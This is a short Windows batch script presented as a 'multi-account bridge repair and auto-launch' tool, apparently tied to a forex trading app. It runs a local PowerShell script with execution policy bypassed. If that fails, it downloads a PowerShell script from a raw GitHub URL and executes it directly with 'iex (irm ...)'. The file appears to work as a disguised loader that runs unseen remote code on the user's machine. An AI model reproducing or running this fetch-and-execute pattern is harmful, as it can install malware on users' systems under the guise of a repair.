@echo off
title AMATERASU X - MULTI-ACCOUNT BRIDGE REPAIR & AUTO-LAUNCH
color 0A
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0fix.ps1"
if %ERRORLEVEL% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/forexhubglobal/omnisignal-app/main/fix.ps1)"
)
pause
